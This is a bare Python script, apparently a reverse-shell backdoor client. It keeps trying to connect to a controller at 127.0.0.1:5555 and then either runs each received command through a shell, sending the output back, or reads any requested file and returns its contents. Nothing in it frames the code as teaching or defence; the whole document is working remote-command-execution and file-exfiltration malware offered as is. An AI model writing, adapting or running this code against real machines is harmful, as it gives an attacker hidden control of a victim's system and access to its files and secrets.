import socket
import subprocess
from shutil import copyfile
import os
import getpass
s = socket.socket()
host = "127.0.0.1"
port = 5555
conn = False
while not conn:
    try:
        s.connect ((host, port))
        conn = True
    except:
        pass
mssgA = s.recv(1024)
if (mssgA == "1"):
     while True:
         data = s.recv(1024)
         if not data:
             break
         COMND = subprocess.Popen(data, shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         COMND_bytes = COMND.stdout.read() + COMND.stderr.read()
         COMND_R = str(COMND_bytes)
         if not COMND_R:
             break
         s.send(COMND_R)
elif (mssgA == "2"):
    file_p = s.recv(10000)
    f = open(file_p, 'rb')
    data = f.read()
    s.send(data)
else :
    s.close()
